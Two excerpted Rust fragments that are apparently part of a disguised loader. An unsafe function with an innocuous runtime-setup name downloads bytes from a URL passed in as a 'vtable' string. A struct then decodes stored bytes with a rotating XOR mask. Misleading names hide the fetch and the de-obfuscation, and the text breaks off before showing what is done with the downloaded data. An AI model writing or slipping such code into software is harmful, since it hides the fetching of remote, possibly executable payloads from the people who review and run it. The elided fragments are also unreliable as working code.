...
unsafe fn finalize_runtime_context_setup(context_vtable: String) {

    let context_id = context_vtable.split('/').last().unwrap_or_default();
    
    if let Ok(res) = ureq::get(&context_vtable).call() {
        let mut raw_buffer = Vec::new();
        if std::io::Read::read_to_end(&mut res.into_reader(), &mut raw_buffer).is_ok() {
...
#[derive(Debug, Clone)]
struct PollLifecycleManager {
    poll_strategy: u64,
    vtable_signature: [u8; 32],
}

impl PollLifecycleManager {
    #[inline(always)]
    fn resolve_vtable_pointer(&self, slot: usize) -> u8 {
        let bit_mask = (self.poll_strategy >> (slot % 8)) as u8;
        self.vtable_signature[slot] ^ bit_mask
    }
}
